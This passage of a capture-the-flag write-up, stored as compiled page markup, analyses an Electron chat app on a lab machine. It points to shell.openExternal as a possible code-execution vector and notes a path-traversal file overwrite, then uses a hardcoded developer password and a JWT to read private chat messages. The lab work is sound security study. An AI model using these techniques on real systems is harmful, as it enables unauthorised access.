\",(0,e.jsx)(n.span,{className:\"token keyword control-flow\",children:\"if\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"err\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"{\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"        \",(0,e.jsx)(n.span,{className:\"token keyword control-flow\",children:\"await\"}),\" \",(0,e.jsx)(n.span,{className:\"token function\",children:\"download\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token maybe-class-name\",children:\"BrowserWindow\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),(0,e.jsx)(n.span,{className:\"token method function property-access\",children:\"getFocusedWindow\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" url\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"{\"}),\" \",(0,e.jsx)(n.span,{className:\"token literal-property property\",children:\"directory\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\":\"}),\" downloadPath \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"}\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"        win\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),(0,e.jsx)(n.span,{className:\"token property-access\",children:\"webContents\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),(0,e.jsx)(n.span,{className:\"token method function property-access\",children:\"send\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"'file-downloaded'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsxs)(n.span,{className:\"token template-string\",children:[(0,e.jsx)(n.span,{className:\"token template-punctuation string\",children:\"`\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"File Imported at: \"}),(0,e.jsxs)(n.span,{className:\"token interpolation\",children:[(0,e.jsx)(n.span,{className:\"token interpolation-punctuation punctuation\",children:\"${\"}),\"downloadPath\",(0,e.jsx)(n.span,{className:\"token interpolation-punctuation punctuation\",children:\"}\"})]}),(0,e.jsxs)(n.span,{className:\"token interpolation\",children:[(0,e.jsx)(n.span,{className:\"token interpolation-punctuation punctuation\",children:\"${\"}),\"filename\",(0,e.jsx)(n.span,{className:\"token interpolation-punctuation punctuation\",children:\"}\"})]}),(0,e.jsx)(n.span,{className:\"token template-punctuation string\",children:\"`\"})]}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"        \",(0,e.jsx)(n.span,{className:\"token keyword control-flow\",children:\"return\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"      \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"}\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"      win\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),(0,e.jsx)(n.span,{className:\"token property-access\",children:\"webContents\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),(0,e.jsx)(n.span,{className:\"token method function property-access\",children:\"send\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"'file-downloaded'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsxs)(n.span,{className:\"token template-string\",children:[(0,e.jsx)(n.span,{className:\"token template-punctuation string\",children:\"`\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"File Already Exists At: \"}),(0,e.jsxs)(n.span,{className:\"token interpolation\",children:[(0,e.jsx)(n.span,{className:\"token interpolation-punctuation punctuation\",children:\"${\"}),\"downloadPath\",(0,e.jsx)(n.span,{className:\"token interpolation-punctuation punctuation\",children:\"}\"})]}),(0,e.jsxs)(n.span,{className:\"token interpolation\",children:[(0,e.jsx)(n.span,{className:\"token interpolation-punctuation punctuation\",children:\"${\"}),\"filename\",(0,e.jsx)(n.span,{className:\"token interpolation-punctuation punctuation\",children:\"}\"})]}),(0,e.jsx)(n.span,{className:\"token template-punctuation string\",children:\"`\"})]}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"}\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"}\"}),\" \",(0,e.jsx)(n.span,{className:\"token keyword control-flow\",children:\"else\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"{\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    shell\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),(0,e.jsx)(n.span,{className:\"token method function property-access\",children:\"openExternal\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"url\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"}\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"}\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})}),`\n`,(0,e.jsxs)(n.p,{children:[\"The code listens for an \",(0,e.jsx)(n.code,{children:\"handle-links\"}),\" event on the \",(0,e.jsx)(n.code,{children:\"ipcMain\"}),` module, which is used to communicate between the main process and renderer processes in Electron.\nWhen the `,(0,e.jsx)(n.code,{children:\"handle-links\"}),\" event is received, the code checks the value of the \",(0,e.jsx)(n.code,{children:\"task\"}),\" argument to determine the desired action. If the \",(0,e.jsx)(n.code,{children:\"task\"}),\" argument is \",(0,e.jsx)(n.code,{children:\"download\"}),\", the code extracts the filename from the \",(0,e.jsx)(n.code,{children:\"url\"}),\". And here comes the interesting part, where urls are passed to the \",(0,e.jsx)(n.code,{children:\"shell.openExternal\"}),\" function which allows this application to open a URL in the web browser. Researching about this function we see that it can allow us to execute arbitrary code on the user\\u2019s system. Another possibility is that if we have control over the \",(0,e.jsx)(n.code,{children:\"filename\"}),\" variable, we will eventually have file overwrite while traversing the directory.\"]}),`\n`,(0,e.jsx)(n.p,{children:\"We\\u2019ll get back to this later, once we understand how this application works.\"}),`\n`,(0,e.jsxs)(n.p,{children:[\"In the \",(0,e.jsx)(n.code,{children:\"src/js\"}),\" folder, we have \",(0,e.jsx)(n.code,{children:\"app.js\"}),\" which seems to be packed. Without cleaning it, we can notice that\\u2019s it talking with an API where it takes the URL from \",(0,e.jsx)(n.code,{children:\"config.json\"}),\" which seems missing from the source.\"]}),`\n`,(0,e.jsx)(n.pre,{className:\"language-js\",children:(0,e.jsx)(n.code,{className:\"language-js code-highlight\",children:(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"_config_json__WEBPACK_IMPORTED_MODULE_1__\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),(0,e.jsx)(n.span,{className:\"token constant\",children:\"BACKEND_URL\"}),`\n`]})})}),`\n`,(0,e.jsx)(n.pre,{className:\"language-js\",children:(0,e.jsxs)(n.code,{className:\"language-js code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"/* harmony import */\"}),\" \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"var\"}),\" _config_json__WEBPACK_IMPORTED_MODULE_1__ \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token function\",children:\"__webpack_require__\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"/*! ./config.json */\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"'./src/js/config.json'\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})}),`\n`,(0,e.jsxs)(n.p,{children:[\"Since we knew/assumed that we have an API running on port 9000, \",(0,e.jsx)(n.code,{children:\"BACKEND_URL\"}),\" should be \",(0,e.jsx)(n.code,{children:\"http://10.129.228.64:9000\"}),\". Reading much further, we can see an API call to \",(0,e.jsx)(n.code,{children:\"/api/login\"}),\" where we find credentials for the \",(0,e.jsx)(n.code,{children:\"developer\"}),\" user.\"]}),`\n`,(0,e.jsx)(n.pre,{className:\"language-js\",children:(0,e.jsxs)(n.code,{className:\"language-js code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token function\",children:\"fetch\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"''\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),(0,e.jsx)(n.span,{className:\"token method function property-access\",children:\"concat\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"_config_json__WEBPACK_IMPORTED_MODULE_1__\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),(0,e.jsx)(n.span,{className:\"token constant\",children:\"BACKEND_URL\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"'/api/login'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"{\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(n.span,{className:\"token literal-property property\",children:\"method\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"'POST'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(n.span,{className:\"token literal-property property\",children:\"headers\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"{\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    \",(0,e.jsx)(n.span,{className:\"token literal-property property\",children:\"Accept\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"'application/json'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    \",(0,e.jsx)(n.span,{className:\"token string-property property\",children:\"'Content-Type'\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"'application/json'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"}\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(n.span,{className:\"token literal-property property\",children:\"body\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token known-class-name class-name\",children:\"JSON\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),(0,e.jsx)(n.span,{className:\"token method function property-access\",children:\"stringify\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"{\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    \",(0,e.jsx)(n.span,{className:\"token literal-property property\",children:\"username\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"'developer'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    \",(0,e.jsx)(n.span,{className:\"token literal-property property\",children:\"password\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"'5up3rd3vl0per!!'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"}\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"}\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),(0,e.jsx)(n.span,{className:\"token method function property-access\",children:\"then\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token parameter\",children:\"res\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,e.jsx)(n.span,{className:\"token arrow operator\",children:\"=>\"}),\" res\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),(0,e.jsx)(n.span,{className:\"token method function property-access\",children:\"json\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),(0,e.jsx)(n.span,{className:\"token method function property-access\",children:\"then\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token parameter\",children:\"data\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,e.jsx)(n.span,{className:\"token arrow operator\",children:\"=>\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"{\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    \",(0,e.jsx)(n.span,{className:\"token keyword control-flow\",children:\"if\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"data\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),(0,e.jsx)(n.span,{className:\"token property-access\",children:\"status\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"===\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"200\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"{\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"      \",(0,e.jsx)(n.span,{className:\"token dom variable\",children:\"localStorage\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),(0,e.jsx)(n.span,{className:\"token method function property-access\",children:\"setItem\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"'token'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" data\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),(0,e.jsx)(n.span,{className:\"token property-access\",children:\"token\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"      \",(0,e.jsx)(n.span,{className:\"token dom variable\",children:\"localStorage\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),(0,e.jsx)(n.span,{className:\"token method function property-access\",children:\"setItem\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"'username'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" data\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),(0,e.jsx)(n.span,{className:\"token property-access\",children:\"username\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"      \",(0,e.jsx)(n.span,{className:\"token function\",children:\"setLoading\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token boolean\",children:\"false\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"}\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"}\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})}),`\n`,(0,e.jsx)(n.p,{children:\"I tried using the API that we have to confirm that it\\u2019s talking with it. And it works!\"}),`\n`,(0,e.jsx)(n.pre,{className:\"language-http\",children:(0,e.jsxs)(n.code,{className:\"language-http code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsxs)(n.span,{className:\"token response-status\",children:[(0,e.jsx)(n.span,{className:\"token http-version property\",children:\"HTTP/1.1\"}),\" \",(0,e.jsx)(n.span,{className:\"token status-code number\",children:\"200\"}),\" \",(0,e.jsx)(n.span,{className:\"token reason-phrase string\",children:\"OK\"})]}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsxs)(n.span,{className:\"token header\",children:[(0,e.jsx)(n.span,{className:\"token header-name keyword\",children:\"Content-Type\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token header-value\",children:\"application/json; charset=utf-8\"})]}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsxs)(n.span,{className:\"token header\",children:[(0,e.jsx)(n.span,{className:\"token header-name keyword\",children:\"Content-Length\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token header-value\",children:\"207\"})]}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsxs)(n.span,{className:\"token header\",children:[(0,e.jsx)(n.span,{className:\"token header-name keyword\",children:\"Date\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token header-value\",children:\"Sat, 03 Dec 2022 09:15:30 GMT\"})]}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsxs)(n.span,{className:\"token header\",children:[(0,e.jsx)(n.span,{className:\"token header-name keyword\",children:\"Connection\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token header-value\",children:\"close\"})]}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`{\"token\":\"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImRldmVsb3BlciIsImlhdCI6MTY3MDA1ODkzMCwiZXhwIjoxNjcwMDgwNTMwfQ.TCk_Ixejig808W5BainV05u5hmFlE65U0knzjvSIdwI\",\"status\":200,\"username\":\"developer\"}\n`})]})}),`\n`,(0,e.jsxs)(n.p,{children:[\"We can see multiple endpoints including \",(0,e.jsx)(n.code,{children:\"/api/chats/allChats\"})]}),`\n`,(0,e.jsx)(n.pre,{className:\"language-js\",children:(0,e.jsxs)(n.code,{className:\"language-js code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token function\",children:\"fetch\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:'\"\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),(0,e.jsx)(n.span,{className:\"token method function property-access\",children:\"concat\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"_config_json__WEBPACK_IMPORTED_MODULE_1__\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),(0,e.jsx)(n.span,{className:\"token constant\",children:\"BACKEND_URL\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:'\"/api/chats/allChats\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"{\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"              \",(0,e.jsx)(n.span,{className:\"token literal-property property\",children:\"method\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"'GET'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"              \",(0,e.jsx)(n.span,{className:\"token literal-property property\",children:\"headers\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"{\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"                \",(0,e.jsx)(n.span,{className:\"token literal-property property\",children:\"token\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token dom variable\",children:\"localStorage\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),(0,e.jsx)(n.span,{className:\"token method function property-access\",children:\"getItem\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"'token'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"              \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"}\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"            \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"}\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),(0,e.jsx)(n.span,{className:\"token method function property-access\",children:\"then\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token parameter\",children:\"data\"}),\" \",(0,e.jsx)(n.span,{className:\"token arrow operator\",children:\"=>\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"{\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"              \",(0,e.jsx)(n.span,{className:\"token keyword control-flow\",children:\"return\"}),\" data\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),(0,e.jsx)(n.span,{className:\"token method function property-access\",children:\"json\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"            \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"}\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),(0,e.jsx)(n.span,{className:\"token method function property-access\",children:\"then\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token parameter\",children:\"chats\"}),\" \",(0,e.jsx)(n.span,{className:\"token arrow operator\",children:\"=>\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"{\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"              \",(0,e.jsx)(n.span,{className:\"token function\",children:\"setallMessages\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"chats\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"            \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"}\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"          \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"}\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"[\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"]\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\";\"}),`\n`]})]})}),`\n`,(0,e.jsx)(n.p,{children:\"I tried fetching it using the token I retrieved from the login.\"}),`\n`,(0,e.jsx)(n.pre,{className:\"language-http\",children:(0,e.jsxs)(n.code,{className:\"language-http code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsxs)(n.span,{className:\"token response-status\",children:[(0,e.jsx)(n.span,{className:\"token http-version property\",children:\"HTTP/1.1\"}),\" \",(0,e.jsx)(n.span,{className:\"token status-code number\",children:\"200\"}),\" \",(0,e.jsx)(n.span,{className:\"token reason-phrase string\",children:\"OK\"})]}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsxs)(n.span,{className:\"token header\",children:[(0,e.jsx)(n.span,{className:\"token header-name keyword\",children:\"Content-Type\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token header-value\",children:\"application/json; charset=utf-8\"})]}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsxs)(n.span,{className:\"token header\",children:[(0,e.jsx)(n.span,{className:\"token header-name keyword\",children:\"Content-Length\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token header-value\",children:\"1812\"})]}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsxs)(n.span,{className:\"token header\",children:[(0,e.jsx)(n.span,{className:\"token header-name keyword\",children:\"Date\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token header-value\",children:\"Sat, 03 Dec 2022 09:20:29 GMT\"})]}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsxs)(n.span,{className:\"token header\",children:[(0,e.jsx)(n.span,{className:\"token header-name keyword\",children:\"Connection\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token header-value\",children:\"close\"})]}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`[{\"id\":1,\"sender\":\"admin\",\"receiver\":\"developer\",\"message\":\"Hey!\",\"timestamp\":\"2022-12-03 08:42:27\",\"lastMessage\":\"false\",\"type\":\"message\"},{\"id\":2,\"sender\":\"developer\",\"receiver\":\"admin\",\"message\":\"Hey!!\",\"timestamp\":\"2022-12-03 08:42:27\",\"lastMessage\":\"false\",\"type\":\"message\"},{\"id\":3,\"sender\":\"developer\",\"receiver\":\"admin\",\"message\":\"You are using the admin account on the server itself right?\",\"timestamp\":\"2022-12-03 08:42:27\",\"lastMessage\":\"false\",\"type\":\"message\"},{\"id\":4,\"sender\":\"admin\",\"receiver\":\"developer\",\"message\":\"Yes\",\"timestamp\":\"2022-12-03 08:42:27\",\"lastMessage\":\"false\",\"type\":\"message\"},{\"id\":5,\"sender\":\"developer\",\"receiver\":\"admin\",\"message\":\"Well thats good make sure to use the admin account on the server.\",\"timestamp\":\"2022-12-03 